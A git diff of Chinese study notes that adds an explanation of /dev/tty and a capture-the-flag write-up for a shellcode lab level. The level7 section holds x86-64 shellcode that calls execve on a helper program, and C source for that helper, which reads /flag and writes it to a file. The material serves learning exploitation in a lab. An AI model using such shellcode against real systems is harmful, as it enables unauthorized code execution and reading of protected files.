@@ -309,7 +309,42 @@ GID 1000: lebron
 
 这些组信息对进程的访问控制有直接影响。如果某个文件的组权限设置为读/写/执行，并且该文件的组所有者是 cdrom（GID 24），那么任何属于 cdrom 组的用户（如 lebron）都可以根据组权限访问该文件。同样，如果进程需要访问某些受限资源（如设备文件），它必须运行在合适的组权限下。
 
-### 
+### 7. /dev/tty是什么？
+`/dev/tty` 是 Unix 和类 Unix 操作系统中的一个设备文件，代表当前进程的控制终端（terminal）。下面是一些关于 `/dev/tty` 的详细解释：
+
+定义和作用：
+
+`/dev/tty` 是一个设备文件，指向与当前进程相关联的终端设备。不论进程是通过命令行运行还是通过图形界面终端运行，`/dev/tty` 都会指向那个特定的终端设备。它用于提供标准输入、标准输出和标准错误输出的接口，使进程能够与用户进行交互。
+历史背景：
+
+“TTY” 原本是电传打字机（teletypewriter）的缩写，这是一种早期的电子通信设备。随着计算机技术的发展，“TTY” 这个术语被保留了下来，表示计算机终端或虚拟终端。
+常见用法：
+
+重定向输入输出：进程可以通过重定向标准输入、标准输出和标准错误到 /dev/tty 来确保其输出被显示在终端上。例如：
+```c
+int fd = open("/dev/tty", O_WRONLY);
+if (fd != -1) {
+    dup2(fd, 1); // 将标准输出重定向到 /dev/tty
+    close(fd);
+}
+```
+检查终端状态：使用 isatty 函数来检查文件描述符是否指向终端设备。
+```c
+if (isatty(STDIN_FILENO)) {
+    printf("Standard input is a terminal.\n");
+} else {
+    printf("Standard input is not a terminal.\n");
+}
+```
+相关设备文件：
+
+`/dev/console`：代表系统控制台设备，通常是系统的主要显示和输入设备。
+`/dev/pts/*`：表示伪终端设备，用于实现虚拟终端，如通过 SSH 连接的终端。
+`/dev/null`：特殊设备文件，丢弃所有写入的数据，读取时返回 EOF。
+通过这些设备文件，Unix 和类 Unix 系统提供了一种灵活的方式来管理和使用各种终端设备，使得系统管理和编程变得更加方便和直观。
+
+### 8.
+
 
 ## level1
 
@@ -629,3 +664,47 @@ call_code:
 
 
 ## level7
+
+在执行 `shellcode_mem` 前，程序关闭了标准输入`（stdin）`，标准输出`（stdout）`和标准错误输出`（stderr）`，因此在当前进程中，标准输出文件描述符 1 和标准错误输出文件描述符 2 已经被关闭。由于 execve 继承了调用它的进程的文件描述符状态，新的进程也将没有有效的标准输出和标准错误输出。
+
+这个跟之前的区别是，取消了回显，也就是说，你无法通过标准输入，看到回显。那么我们就换个思路，将读取到的flag内容写入到一个文件中，然后再点击这个文件查看内容就行了。当然，你也可以将标准输出重定向到某个文件查看内容。
+
+```asm
+BITS 64
+
+section .text
+global _start
+
+_start:
+    jmp short call_shellcode
+
+get_address:
+    pop rdi
+    mov rsi, 0
+    mov rdx, 0
+    mov al, 0x3b
+    syscall
+
+call_shellcode:
+    call get_address
+    db "/home/hacker/Shellcode/level7/openflag",0
+```
+
+```c
+#include<stdio.h>
+
+int main(){
+    char* filename = "/flag";
+    int fd;
+    fd = open(filename,0);
+    char buffer[100];
+    read(fd,buffer, 100);
+    puts(buffer);
+    FILE* file = fopen("/home/hacker/Shellcode/level7/flag.txt","w");
+    fwrite(buffer,sizeof(char),sizeof(buffer),file);
+}
+```
+
+## level8
+
+
